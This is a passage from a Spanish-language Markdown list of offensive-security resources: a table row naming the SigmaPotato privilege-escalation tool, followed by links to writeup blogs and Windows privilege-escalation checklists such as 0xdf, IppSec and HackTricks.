| SigmaPotato | https://github.com/tylerdotrar/SigmaPotato |

###  13.9. <a name='recursos-y-blogs'></a>Recursos y Blogs

| Nombre                                                  | URL                                                                                                                                                                          |
| ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0xdf                                                    | [https://0xdf.gitlab.io/](https://0xdf.gitlab.io/)                                                                                                                           |
| IppSec.rocks                                            | [https://ippsec.rocks/?#](https://ippsec.rocks/?#)                                                                                                                           |
| IppSec (YouTube)                                        | [https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)                                                         |
| HackTricks                                              | [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)                                                                                                                 |
| HackTricks Local Windows Privilege Escalation Checklist | [https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) |
| Rednode Windows Privilege Escalation                    | [https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/](https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/)     |
